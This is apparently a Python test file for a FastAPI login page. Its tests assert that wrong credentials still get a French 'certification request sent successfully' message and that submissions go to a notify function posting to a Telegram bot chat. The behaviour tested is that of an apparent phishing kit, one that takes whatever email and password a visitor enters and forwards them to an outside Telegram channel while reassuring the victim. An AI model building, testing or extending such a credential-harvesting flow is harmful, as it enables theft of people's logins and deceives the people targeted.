import os
import unittest
from unittest.mock import patch

from fastapi.testclient import TestClient

import app
from telegram import notify as telegram_notify


class LoginFlowTests(unittest.TestCase):
    def test_invalid_credentials_still_show_success_message(self):
        client = TestClient(app.app)

        with patch.object(app, "notify") as mock_notify:
            response = client.post(
                "/login",
                data={"email": "wrong@example.com", "password": "badpass"},
            )

        self.assertEqual(response.status_code, 200)
        body = response.text
        self.assertIn("Votre demande de certification a été envoyée avec succès.", body)
        mock_notify.assert_called_once()

    def test_notify_reads_token_from_environment_at_runtime(self):
        with patch.dict(os.environ, {"TELEGRAM_BOT_TOKEN": "token123", "TELEGRAM_CHAT_ID": "chat456"}, clear=False):
            with patch("telegram.httpx.post") as mock_post:
                telegram_notify("hello")

        mock_post.assert_called_once()
        payload = mock_post.call_args.kwargs["json"]
        self.assertEqual(payload["chat_id"], "chat456")
        self.assertIn("hello", payload["text"])


if __name__ == "__main__":
    unittest.main()
